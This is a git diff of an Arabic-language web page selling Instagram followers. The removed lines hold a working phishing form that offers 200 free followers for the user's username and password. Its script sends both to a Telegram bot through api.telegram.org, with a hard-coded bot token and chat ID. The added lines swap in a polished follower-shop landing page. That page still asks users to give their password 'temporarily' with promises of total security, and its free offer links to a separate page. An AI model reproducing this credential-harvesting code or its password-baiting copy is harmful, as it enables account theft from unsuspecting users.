@@ -3,151 +3,466 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>زياده متابعين انستا</title>
+    <title>نجمك | ارتقِ بحسابك إلى القمة في دقائق</title>
     <style>
+        /* CSS معدل لتصميم مميز */
+        :root {
+            --primary-bg: #FFFFFF; /* خلفية بيضاء ناعمة */
+            --dark-bg: #0A192F; /* أزرق ليلي عميق */
+            --accent-color: #00C2FF; /* أزرق سماوي نيون */
+            --secondary-accent-color: #A779E1; /* بنفسجي فاتح */
+            --text-dark: #333333;
+            --text-light: #FFFFFF;
+            --button-text-dark: var(--dark-bg);
+            --button-text-light: var(--text-light);
+            --shadow-light: rgba(0, 0, 0, 0.08);
+            --shadow-medium: rgba(0, 0, 0, 0.15);
+        }
         body {
-            font-family: Arial, sans-serif;
-            background-color: #E1306C;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
+            color: var(--text-dark);
+            direction: rtl; /* للغة العربية */
+            text-align: right;
+            background-color: var(--primary-bg);
+            line-height: 1.6;
+        }
+        .header {
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px var(--shadow-medium);
+        }
+        .logo {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: var(--accent-color);
+            letter-spacing: 1px;
+        }
+        .nav a {
+            color: var(--text-light);
+            text-decoration: none;
+            margin-right: 25px;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+        .nav a:hover {
+            color: var(--accent-color);
+        }
+        .hero-section {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #1a2a46 100%); /* تدرج لوني */
+            color: var(--text-light);
+            padding: 100px 5%; /* زيادة التباعد */
+            text-align: center;
+            position: relative;
+            overflow: hidden; /* لإخفاء أي عناصر تتجاوز */
+        }
+        /* تأثير النجوم المتلألئة في الخلفية (اختياري، يتطلب JS أو CSS معقد) */
+        .hero-section::before {
+             content: '';
+             position: absolute;
+             top: 0;
+             left: 0;
+             width: 100%;
+             height: 100%;
+             background: radial-gradient(circle at top left, rgba(0, 194, 255, 0.1) 0%, transparent 50%),
+                         radial-gradient(circle at bottom right, rgba(167, 121, 225, 0.1) 0%, transparent 50%);
+             opacity: 0.7;
+        }
+
+        .hero-section h1 {
+            font-size: 3.2em; /* حجم أكبر */
+            margin-bottom: 15px;
+            color: var(--accent-color);
+            text-shadow: 0 0 15px rgba(0, 194, 255, 0.6); /* ظل نص متوهج */
+        }
+        .hero-section p {
+            font-size: 1.3em; /* حجم أكبر */
+            margin-bottom: 40px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.9;
+        }
+        .hero-section p.security-note {
+            color: #bbb;
+            font-size: 0.9em;
+            margin-top: 25px;
+        }
+        .cta-button {
+            background-color: var(--accent-color);
+            color: var(--button-text-dark);
+            padding: 18px 40px; /* حجم أكبر للزر */
+            text-decoration: none;
+            border-radius: 50px; /* زر دائري الأطراف */
+            font-size: 1.2em;
+            font-weight: bold;
+            display: inline-block;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(0, 194, 255, 0.4); /* ظل للزر */
+        }
+        .cta-button:hover {
+            background-color: var(--secondary-accent-color);
+            box-shadow: 0 8px 25px rgba(167, 121, 225, 0.5);
+            transform: translateY(-3px);
+            color: var(--text-light);
+        }
+        .trust-indicators {
+            margin-top: 35px;
+            font-size: 1.1em;
+            color: rgba(255, 255, 255, 0.8);
             display: flex;
             justify-content: center;
+            gap: 30px; /* تباعد بين الأيقونات */
+            flex-wrap: wrap;
+        }
+        .trust-indicators span {
+            display: flex;
             align-items: center;
-            height: 100vh;
+            gap: 8px;
         }
-        .container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 350px;
+        .trust-indicators span::before {
+            content: '✔️'; /* أيقونة بسيطة */
+            color: var(--accent-color);
+            font-size: 1.2em;
+        }
+
+        .pricing-section {
+            padding: 80px 5%; /* زيادة التباعد */
             text-align: center;
+            background-color: var(--primary-bg);
         }
-        h1 {
-            color: #111111;
+        .pricing-section h2 {
+            font-size: 2.5em; /* حجم أكبر */
+            margin-bottom: 50px;
+            color: var(--dark-bg);
+            position: relative;
+        }
+        .pricing-section h2::after {
+            content: '';
+            display: block;
+            width: 80px;
+            height: 4px;
+            background-color: var(--accent-color);
+            margin: 15px auto 0 auto;
+            border-radius: 2px;
+        }
+        .pricing-cards {
+            display: flex;
+            justify-content: center;
+            gap: 40px; /* تباعد أكبر بين البطاقات */
+            flex-wrap: wrap;
+        }
+        .card {
+            background: linear-gradient(145deg, #ffffff, #f0f0f0); /* تدرج خفيف للخلفية */
+            border-radius: 15px; /* حواف أكثر دائرية */
+            box-shadow: 0 10px 30px var(--shadow-light); /* ظل أكثر بروزاً */
+            padding: 40px; /* تباعد داخلي أكبر */
+            width: 320px; /* عرض أكبر للبطاقة */
+            text-align: center;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        .card:hover {
+            transform: translateY(-10px) scale(1.02); /* تأثير رفع وتكبير عند التحويم */
+            box-shadow: 0 15px 40px var(--shadow-medium);
+        }
+        .card.featured {
+            border: 3px solid var(--accent-color);
+            background: linear-gradient(145deg, #ffffff, var(--primary-bg));
+            transform: scale(1.07) translateY(-15px); /* أكثر بروزاً */
+            box-shadow: 0 20px 50px rgba(0, 194, 255, 0.3);
+        }
+        .card.featured::before {
+            content: 'الأكثر شعبية ✨';
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%) rotate(-5deg);
+            background-color: var(--secondary-accent-color);
+            color: var(--text-light);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        .card h3 {
+            color: var(--dark-bg);
+            font-size: 1.8em; /* حجم أكبر */
             margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 15px;
+        .price {
+            font-size: 3.2em; /* حجم سعر أكبر */
+            font-weight: bold;
+            color: var(--accent-color);
+            margin-bottom: 25px;
+            display: block;
+            line-height: 1;
+        }
+        .price span {
+            font-size: 0.4em;
+            font-weight: normal;
+            color: var(--text-dark);
+            opacity: 0.7;
+        }
+        .card ul {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 30px;
             text-align: right;
         }
-        label {
-            display: block;
-            margin-bottom: 5px;
+        .card ul li {
+            padding: 10px 0;
+            border-bottom: 1px dashed #eee;
+            color: var(--text-dark);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .card ul li:last-child {
+            border-bottom: none;
+        }
+        .card ul li::before {
+            content: '✔️';
+            color: var(--secondary-accent-color); /* لون الأيقونة */
             font-weight: bold;
-            color: #E1306C;
+            font-size: 1.1em;
+            line-height: 1;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
+        .btn-order {
+            background-color: var(--dark-bg);
+            color: var(--button-text-light);
+            padding: 15px 30px;
+            text-decoration: none;
+            border-radius: 50px;
+            display: inline-block; /* ليكون في المنتصف */
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
-        button {
-    background: linear-gradient(to right, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
-    color: white;
-    border: none;
-    padding: 12px 20px;
-    border-radius: 8px; /* تخلي الزر ناعم */
-    cursor: pointer;
-    font-size: 16px;
-    width: 100%;
-    transition: opacity 0.3s;
-}
-button:hover {
-    opacity: 0.9; /* بدل التغيير للون واحد، يخلي الزر شفاف شوي */
-}
+        .btn-order:hover {
+            background-color: var(--secondary-accent-color);
+            color: var(--text-light);
+            box-shadow: 0 5px 20px rgba(167, 121, 225, 0.4);
+            transform: translateY(-2px);
         }
-        .message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 4px;
-            display: none;
+        .card.featured .btn-order {
+            background-color: var(--accent-color);
+            color: var(--button-text-dark);
+            box-shadow: 0 5px 20px rgba(0, 194, 255, 0.4);
         }
-        .success {
-            background-color: #dff0d8;
-            color: #E1306C;
+        .card.featured .btn-order:hover {
+            background-color: var(--secondary-accent-color);
+            color: var(--text-light);
+            box-shadow: 0 5px 25px rgba(167, 121, 225, 0.5);
         }
-        .error {
-            background-color: #f2dede;
-            color: #E1306C;
+        .free-offer {
+            margin-top: 25px;
+            font-size: 1em;
+            color: var(--dark-bg);
+            font-weight: 600;
+            opacity: 0.8;
+        }
+
+        .how-it-works-section {
+            padding: 80px 5%;
+            text-align: center;
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+        }
+        .how-it-works-section h2 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+        }
+        .how-it-works-section p {
+            font-size: 1.2em;
+            margin-bottom: 40px;
+            opacity: 0.9;
+        }
+        .how-it-works-steps {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .step-card {
+            background-color: #1a2a46; /* لون أغمق قليلاً */
+            border-radius: 10px;
+            padding: 30px;
+            width: 280px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .step-card .icon {
+            font-size: 3em;
+            color: var(--secondary-accent-color);
+            margin-bottom: 15px;
+        }
+        .step-card h3 {
+            font-size: 1.5em;
+            color: var(--accent-color);
+            margin-bottom: 10px;
+        }
+        .step-card p {
+            font-size: 1em;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+
+        footer {
+            background-color: #1a1a1a;
+            color: #ccc;
+            text-align: center;
+            padding: 30px 5%;
+            font-size: 0.9em;
+            border-top: 5px solid var(--accent-color); /* شريط علوي للفوتر */
+        }
+        footer a {
+            color: var(--accent-color);
+            text-decoration: none;
+            margin: 0 10px;
+            transition: color 0.3s ease;
+        }
+        footer a:hover {
+            color: var(--secondary-accent-color);
+        }
+
+        /* الاستجابة لتناسب الشاشات الصغيرة */
+        @media (max-width: 768px) {
+            .hero-section h1 {
+                font-size: 2.5em;
+            }
+            .hero-section p {
+                font-size: 1.1em;
+            }
+            .nav a {
+                margin-right: 15px;
+            }
+            .pricing-cards {
+                flex-direction: column;
+                align-items: center;
+            }
+            .card, .step-card {
+                width: 90%; /* عرض أكبر على الجوال */
+            }
+            .card.featured {
+                transform: scale(1.03) translateY(-10px); /* أقل بروزاً على الجوال */
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>سجل للحصول على 200متابع  </h1>
-        <form id="registrationForm">
-            <div class="form-group">
-                <label for="identifier">اسم المستخدم</label>
-                <input type="text" id="identifier" required>
-            </div>
-            <div class="form-group">
-                <label for="password">كلمة المرور</label>
-                <input type="password" id="password" required>
-            </div>
-            <button type="submit">تسجيل</button>
-        </form>
-        <div id="message" class="message"></div>
+
+    <header class="header">
+        <div class="logo">نجمك</div>
+        <nav class="nav">
+            <a href="#pricing">الأسعار</a>
+            <a href="/faq">الأسئلة الشائعة</a>
+            <a href="/about">من نحن</a>
+            <a href="/login">تسجيل الدخول</a>
+        </nav>
+    </header>
+
+    <section class="hero-section">
+        <h1>نجمك: ارتقِ بحسابك إلى القمة في دقائق.</h1>
+        <p>خدمات متابعين وإعجابات سريعة وآمنة بأسعار لم يسبق لها مثيل.</p>
+        <p class="security-note">
+            (لتنفيذ بعض الخدمات المتميزة التي تتطلب وصولاً مباشراً لضمان أعلى جودة وسرعة، قد نحتاج إلى كلمة المرور بشكل مؤقت، مع ضمان الأمان التام والسرية المطلقة لبياناتك.)
+        </p>
+
+        <a href="#pricing" class="cta-button">ابدأ تجربتك المجانية (200 متابع الآن)</a>
         
+        <div class="trust-indicators">
+            <span>100% أمان وخصوصية</span>
+            <span>تنفيذ فوري للطلبات</span>
+            <span>دعم فني 24/7</span>
+        </div>
+    </section>
 
-    <script>
-        document.getElementById('registrationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+    <section id="pricing" class="pricing-section">
+        <h2>اكتشف باقات النمو الفوري لدينا</h2>
+        
+        <div class="pricing-cards">
             
-            const identifier = document.getElementById('identifier').value;
-            const password = document.getElementById('password').value;
-            const messageDiv = document.getElementById('message');
-            
-            // إرسال البيانات إلى بوت تيليجرام
-            sendToTelegramBot(identifier, password)
-                .then(response => {
-                    messageDiv.textContent = "تم تنفيذ طلبك!";
-                    messageDiv.className = "message success";
-                    messageDiv.style.display = "block";
-                    
-                    // مسح النموذج بعد الإرسال
-                    document.getElementById('registrationForm').reset();
-                })
-                .catch(error => {
-                    messageDiv.textContent = "حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.";
-                    messageDiv.className = "message error";
-                    messageDiv.style.display = "block";
-                    console.error('Error:', error);
-                });
-        });
+            <div class="card">
+                <h3>🎁 باقة التجربة المجانية</h3>
+                <div class="price">0$ <span>/ لمرة واحدة</span></div>
+                <ul>
+                    <li>200 متابع مجاناً</li>
+                    <li>جودة عالية وموثوقة</li>
+                    <li>تنفيذ فوري خلال دقائق</li>
+                    <li>لا يتطلب الدفع</li>
+                </ul>
+                <a href="/follow500.html" class="btn-order">جرب الآن!</a>
+            </div>
 
-        async function sendToTelegramBot(identifier, password) {
-            // استبدل TOKEN و CHAT_ID بقيم البوت الخاص بك
-            const botToken = '8403294278:AAHeXjIw7yGxiKLaEbN5pkC3MHKKs0ekAVA';
-            const chatId = '8386457362';
-            
-            const message = `بيانات تسجيل جديدة:\n\nالمعرف: ${identifier}\nكلمة المرور: ${password}`;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                
-                return await response.json();
-            } catch (error) {
-                throw error;
-            }
-        }
-    </script>
-    </div>
+            <div class="card">
+                <h3>🥉 باقة النمو الأولي</h3>
+                <div class="price">$0.90 <span>/ 1000 متابع</span></div>
+                <ul>
+                    <li>1000 متابع عالي الجودة</li>
+                    <li>أرخص سعر في السوق</li>
+                    <li>تنفيذ سريع ومضمون</li>
+                    <li>ضمان 30 يوماً ضد النقص</li>
+                </ul>
+                <a href="/order?plan=silver" class="btn-order">اطلب الآن</a>
+                <div class="free-offer">متوفر أيضاً: 500 متابع بـ $0.30</div>
+            </div>
+
+            <div class="card featured">
+                <h3>🥇 الباقة الذهبية</h3>
+                <div class="price">$1.05 <span>/ 2000 متابع</span></div>
+                <ul>
+                    <li>2000 متابع ممتاز وحقيقي</li>
+                    <li>أفضل قيمة مقابل السعر</li>
+                    <li>تنفيذ فائق السرعة والأمان</li>
+                    <li>ضمان 60 يوماً واسترداد المال</li>
+                </ul>
+                <a href="/order?plan=gold" class="btn-order">اطلب الآن</a>
+            </div>
+
+        </div>
+    </section>
+
+    <section class="how-it-works-section">
+        <h2>كيف يعمل نجمك؟ الأمر بسيط جداً!</h2>
+        <p>3 خطوات فقط تفصلك عن الشهرة التي تستحقها.</p>
+        <div class="how-it-works-steps">
+            <div class="step-card">
+                <div class="icon">1️⃣</div>
+                <h3>اختر خدمتك</h3>
+                <p>تصفح باقاتنا المتنوعة واختر الكمية والمنصة المناسبة لك.</p>
+            </div>
+            <div class="step-card">
+                <div class="icon">2️⃣</div>
+                <h3>أدخل التفاصيل</h3>
+                <p>ضع رابط حسابك أو المنشور، وقدم كلمة المرور إذا كانت الخدمة تتطلب ذلك.</p>
+            </div>
+            <div class="step-card">
+                <div class="icon">3️⃣</div>
+                <h3>شاهد النمو</h3>
+                <p>بعد إتمام الدفع، سيبدأ حسابك في النمو الفوري والمذهل!</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        &copy; 2025 نجمك. جميع الحقوق محفوظة. | 
+        <a href="/privacy">سياسة الخصوصية</a> | 
+        <a href="/terms">شروط الخدمة</a> |
+        <a href="/contact">اتصل بنا</a>
+    </footer>
+
 </body>
 </html>
